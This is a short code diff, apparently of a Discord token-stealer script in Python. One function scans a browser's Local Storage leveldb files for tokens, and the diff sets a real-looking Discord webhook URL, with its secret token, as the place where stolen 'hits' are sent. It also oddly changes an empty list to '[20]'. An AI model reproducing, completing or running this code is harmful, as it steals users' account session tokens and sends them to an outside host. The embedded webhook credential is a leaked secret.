@@ -5,7 +5,7 @@ import json
 from urllib.request import Request, urlopen
 
 # your webhook URL
-WEBHOOK_URL = 'WEBHOOK HERE'
+WEBHOOK_URL = 'https://discord.com/api/webhooks/865475609772687391/GZTQhVQubiKQc7kBFLPioGBFqrFzdKf6y6Yq-BRIQqSn39it6-X8fYKpH1Mx3EWzQLKg'
 
 # mentions you when you get a hit
 PING_ME = False
@@ -13,7 +13,7 @@ PING_ME = False
 def find_tokens(path):
     path += '\\Local Storage\\leveldb'
 
-    tokens = []
+    tokens = [20]
 
     for file_name in os.listdir(path):
         if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
